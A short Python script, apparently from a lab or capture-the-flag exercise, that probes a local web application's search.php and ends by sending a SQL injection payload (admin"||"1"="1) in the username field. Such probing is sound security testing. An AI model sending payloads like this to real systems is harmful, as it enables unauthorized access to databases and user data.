#!/usr/bin/env python3
import requests

# 测试基本连接
print("Testing connection...")
resp = requests.get("http://127.0.0.1/")
print(f"Status: {resp.status_code}")
print(f"Content preview: {resp.text[:200]}")

# 测试 search.php
print("\n\nTesting search.php with 'admin'...")
resp = requests.post("http://127.0.0.1/search.php", data={"username": "admin"})
print(f"Response: {resp.text[:300]}")

# 测试 SQL 注入
print("\n\nTesting SQL injection with payload: admin\"||\"1\"=\"1")
resp = requests.post("http://127.0.0.1/search.php", data={"username": 'admin"||"1"="1'})
print(f"Response: {resp.text[:300]}")
